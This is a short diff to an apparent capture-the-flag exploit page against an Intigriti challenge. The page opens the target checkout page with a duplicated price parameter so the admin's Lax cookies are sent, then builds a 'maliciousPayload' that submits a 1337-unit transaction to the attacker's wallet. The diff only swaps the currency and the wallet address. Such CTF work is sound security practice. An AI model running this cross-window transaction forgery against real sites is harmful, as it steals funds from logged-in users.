@@ -13,14 +13,14 @@
         document.getElementById('exploitBtn').onclick = function() {
             // Step 1: Open the vulnerable page in a new tab.
             // This ensures SameSite=Lax cookies ARE sent, so the Admin is logged in.
-            var targetWindow = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=&price=1");
+            var targetWindow = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=XMR&price=&price=1");
 
             var maliciousPayload = {
                 type: 'submitTransaction',
                 transaction: {
-                    currency: '1337COIN', 
+                    currency: 'XMR', 
                     amount: 1337,
-                    toAddress: '10970063d33e32396bb80753a2b902d568' // Your wallet
+                    toAddress: '12c7d58cdda1cea53b6c0c0023ac89c94b' // Your wallet
                 }
             };
 
